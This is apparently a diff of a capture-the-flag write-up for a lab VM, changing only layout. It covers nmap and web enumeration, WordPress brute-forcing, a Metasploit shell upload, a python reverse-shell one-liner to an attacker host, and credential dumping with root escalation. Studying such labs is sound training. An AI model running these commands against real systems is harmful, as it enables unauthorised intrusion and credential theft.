@@ -1,4 +1,5 @@
-[*] 1. Find host: nmap -sn 192.168.56.0/24
+[*]
+1. Find host: nmap -sn 192.168.56.0/24
 Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-05 13:41 UTC
 Nmap scan report for ubuntu-bionic-1 (192.168.56.1)
 Host is up (0.00059s latency).
@@ -6,7 +7,8 @@ Nmap scan report for 192.168.56.101
 Host is up (0.0038s latency).
 Nmap done: 256 IP addresses (2 hosts up) scanned in 4.75 seconds
 
-[*] 2. Quick scan: nmap 192.168.56.101
+[*]
+2. Quick scan: nmap 192.168.56.101
 Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-05 13:43 UTC
 Nmap scan report for 192.168.56.101
 Host is up (0.015s latency).
@@ -22,7 +24,8 @@ PORT    STATE SERVICE
 993/tcp open  imaps
 995/tcp open  pop3s
 
-[*] 3. Service scan: nmap -A -p 22,53,80,110,139,143,445,993,995 192.168.56.101
+[*]
+3. Service scan: nmap -A -p 22,53,80,110,139,143,445,993,995 192.168.56.101
 Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-05 13:45 UTC
 Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 33.33% done; ETC: 13:45 (0:00:12 remaining)
@@ -84,13 +87,16 @@ Host script results:
 |_  message_signing: disabled (dangerous, but default)
 |_smb2-time: Protocol negotiation failed (SMB2)
 
-[*] 4. First look
+[*]
+4. First look
 Old SSH version would allow for user enumeration, apache version is old and might allow shellshock to .cgi files, SMB version is old. Enumerating some more
 
-[*] 5. SSH enumeration: ssh 192.168.56.101
+[*]
+5. SSH enumeration: ssh 192.168.56.101
 no banner
 
-[*] 6. DNS enumeration: Quick bash script
+[*]
+6. DNS enumeration: Quick bash script
 hosts=(192.168.56.101 localhost 127.0.0.1)
 for i in ${hosts[@]}; do
   host 192.168.56.101 $hosts
@@ -98,7 +104,8 @@ done
 
 All queries failed :(
 
-[*] 7. HTTP enumeration: nikto -h 192.168.56.101
+[*]
+7. HTTP enumeration: nikto -h 192.168.56.101
 + Target IP:          192.168.56.101
 + Target Hostname:    192.168.56.101
 + Target Port:        80
@@ -118,7 +125,8 @@ All queries failed :(
 + 6544 items checked: 0 error(s) and 9 item(s) reported on remote host
 + End Time:           2020-09-05 14:02:00 (GMT0) (125 seconds)
 
-[*] 8. HTTP directory enumeration: dirb http://192.168.56.101/ -a linux -t 40 | grep "CODE:200"
+[*]
+8. HTTP directory enumeration: dirb http://192.168.56.101/ -a linux -t 40 | grep "CODE:200"
 
 + http://192.168.56.101/hacking (CODE:200|SIZE:616848)
 + http://192.168.56.101/index (CODE:200|SIZE:100)
@@ -140,7 +148,8 @@ All queries failed :(
 + http://192.168.56.101/wordpress/wp-trackback (CODE:200|SIZE:135)
 + http://192.168.56.101/wordpress/xmlrpc (CODE:200|SIZE:42)
 + http://192.168.56.101/wordpress/xmlrpc.php (CODE:200|SIZE:42)
-[*] 9. Robots.txt entry (cute)
+[*]
+9. Robots.txt entry (cute)
 Disallow: Hackers
 Allow: /wordpress/
    ____                              
@@ -149,7 +158,8 @@ Allow: /wordpress/
 #/ \_/ /| |_| | (_| | (_) | (_| | |   
 #\___,_\ \__,_|\__,_|\___/ \__,_|_|   
 
-[*] 10. Quick bruteforce
+[*]
+10. Quick bruteforce
 [+] URL: http://192.168.56.101/wordpress/ [192.168.56.101]
 [+] Started: Sat Sep  5 14:52:13 2020
 
@@ -247,7 +257,8 @@ All Found
 [+] Elapsed time: 00:00:09
 
 
-[*] 11. Get shell 
+[*]
+11. Get shell 
 msfconsle
 use unix/webapp/wp_admin_shell_upload
 set LHOST 192.168.56.1
@@ -259,15 +270,18 @@ set PAYLOAD php/reverse_php
 set RHOSTS 192.168.56.101
 expliot
 
-[*] 12. Move shell to persist
+[*]
+12. Move shell to persist
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-[*] 13. Upgrade shell to interactive
+[*]
+13. Upgrade shell to interactive
 python -c "import pty;pty.spawn(['/bin/bash', '-i'])"
 reset
 xterm
 
-[*] 14. Priv esc: wp-config.php
+[*]
+14. Priv esc: wp-config.php
 define('DB_NAME', 'wordpress');
 
 /** MySQL database username */
@@ -279,7 +293,8 @@ define('DB_PASSWORD', 'rootpassword!');
 /** MySQL hostname */
 define('DB_HOST', 'localhost');
 
-[*] 15. mysql enumeration: 
+[*]
+15. mysql enumeration: 
 show databases;
 +--------------------+
 | Database           |
@@ -322,19 +337,22 @@ wpuser $P$BdcZZVb0ssMccLU1ECFCtUihocqQ0S.
 select * from lep_users;
 admin 5f4dcc3b5aa765d61d8327deb882cf99
 
-[*] 16. Escalate users:
+[*]
+16. Escalate users:
 cat /home/wpadmin/flag.txt
 2bafe61f03117ac66a73c3c514de796e
 used md5online to decrypt md5sum
 Found : QuaoarWordpress
 
-[*] 17. Login as user
+[*]
+17. Login as user
 This was NOT the pass. I was however to login as root with the same creds as mysql
 
 su - root
 rootpassword!
 
-[*] 18. Claim flag
+[*]
+18. Claim flag
 cat flag.txt
 8e3f9ec016e3598c5eec11fd3d73f6fb
 
